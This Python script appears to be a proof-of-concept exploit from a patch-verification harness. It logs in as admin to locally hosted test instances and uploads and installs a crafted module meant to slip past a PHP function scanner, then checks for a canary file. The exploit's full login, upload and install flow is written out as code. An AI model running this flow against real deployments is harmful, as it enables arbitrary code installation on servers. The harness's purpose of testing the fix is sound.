#!/usr/bin/env python3
"""bypass_poc.py -- CVE-2026-29103: ModuleScanner bypass via string concatenation.

Uploads a crafted Module Loader Package whose PHP uses string concatenation
('file_get'.'_contents') to build function names from pieces, exploiting
the $checkFunction reset on single-char tokens in the v7.15.0 scanner.

Expected: installs + canary surfaces on V1 (7.15.0); blocked on V2 (7.15.1 AST scanner).
"""
import os
import re
import sys
import time
import requests

CASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MODULE_ZIP = os.path.join(CASE_DIR, "_heldout", "bypass_module.zip")

PORTS = {"v0": 39140, "v1": 39141, "v2": 39142}
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!"
MODULE_NAME = "PCBBypass"
MARKER_FILE = "pcb_marker_bypass.txt"


def get_base_url(version: str) -> str:
    return f"http://127.0.0.1:{PORTS[version]}"


def login(session: requests.Session, base_url: str) -> bool:
    session.get(f"{base_url}/index.php?module=Users&action=Login", timeout=30)
    session.post(f"{base_url}/index.php", data={
        "module": "Users", "action": "Authenticate",
        "user_name": ADMIN_USER, "username_password": ADMIN_PASS, "Login": "Log In",
    }, allow_redirects=True, timeout=30)
    check = session.get(f"{base_url}/index.php?module=Administration&action=index", timeout=30)
    if "Module Loader" in check.text or "UpgradeWizard" in check.text:
        print(f"[bypass_poc] Logged in as admin")
        return True
    return False


def upload_and_install(session: requests.Session, base_url: str, zip_path: str, module_name: str) -> dict:
    result = {"uploaded": False, "installed": False, "scanner_blocked": False, "detail": ""}

    with open(zip_path, "rb") as f:
        r = session.post(
            f"{base_url}/index.php?module=Administration&view=module&action=UpgradeWizard&run=upload",
            files={"upgrade_zip": (os.path.basename(zip_path), f, "application/zip")},
            data={"run": "upload"},
            allow_redirects=True,
            timeout=60,
        )

    body = r.text.lower()
    if "ml_manifest_issue" in body or "ml_invalid_function" in body:
        result["scanner_blocked"] = True
        result["detail"] = "Scanner blocked at manifest scan"
        return result

    result["uploaded"] = True
    print(f"[bypass_poc] Module uploaded")

    list_r = session.get(
        f"{base_url}/index.php?module=Administration&action=UpgradeWizard&view=module",
        timeout=30,
    )

    data_match = re.findall(r"mti_data\s*=\s*\[(.*?)\];", list_r.text, re.DOTALL)
    file_hash = None
    if data_match:
        entries = re.findall(r"\[([^\]]+)\]", data_match[0])
        for entry in entries:
            if module_name in entry:
                hashes = re.findall(r"'([a-f0-9]{32})'", entry)
                if hashes:
                    file_hash = hashes[0]
                    break
        if not file_hash:
            hashes = re.findall(r"'([a-f0-9]{32})'", data_match[0])
            if hashes:
                file_hash = hashes[-2] if len(hashes) >= 2 else hashes[0]

    if not file_hash:
        result["detail"] = "Could not find file hash"
        return result

    r = session.post(
        f"{base_url}/index.php",
        data={
            "entryPoint": "HandleAjaxCall",
            "to_pdf": "1",
            "module": "Administration",
            "action": "HandleAjaxCall",
            "method": "performInstall",
            "file": file_hash,
        },
        timeout=120,
    )

    install_body = r.text.lower()
    if "invalid function" in install_body or "ml_invalid" in install_body or "file issues" in install_body:
        result["scanner_blocked"] = True
        issues = re.findall(r"(?:Invalid Function|ML_INVALID)[^<]*", r.text, re.IGNORECASE)
        result["detail"] = f"Scanner blocked at install: {'; '.join(issues[:3])}"
        print(f"[bypass_poc] SCANNER BLOCKED: {result['detail']}")
        return result

    if "success" in install_body:
        result["installed"] = True
        print(f"[bypass_poc] Module installed successfully")
    else:
        result["detail"] = f"Install unclear: {r.text[:200]}"

    return result


def check_canary(session: requests.Session, base_url: str) -> str:
    try:
        r = session.get(f"{base_url}/{MARKER_FILE}", timeout=15)
        if r.status_code == 200 and r.text.strip():
            return r.text.strip()
    except Exception:
        pass
    return ""


def run(version: str = "v1") -> str:
    base_url = get_base_url(version)
    session = requests.Session()
    print(f"[bypass_poc] Targeting {version} at {base_url}")

    for _ in range(60):
        try:
            r = session.get(f"{base_url}/index.php", timeout=10)
            if r.status_code == 200:
                break
        except Exception:
            pass
        time.sleep(5)
    else:
        return "ERROR: app not reachable"

    if not login(session, base_url):
        return "ERROR: login failed"

    result = upload_and_install(session, base_url, MODULE_ZIP, MODULE_NAME)

    if result["scanner_blocked"]:
        return "BLOCKED_BY_SCANNER"
    if not result["installed"]:
        return f"ERROR: {result['detail']}"

    time.sleep(2)
    marker = check_canary(session, base_url)
    return marker if marker else "NO_FLAG_DETECTED"


if __name__ == "__main__":
    version = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(run(version=version))
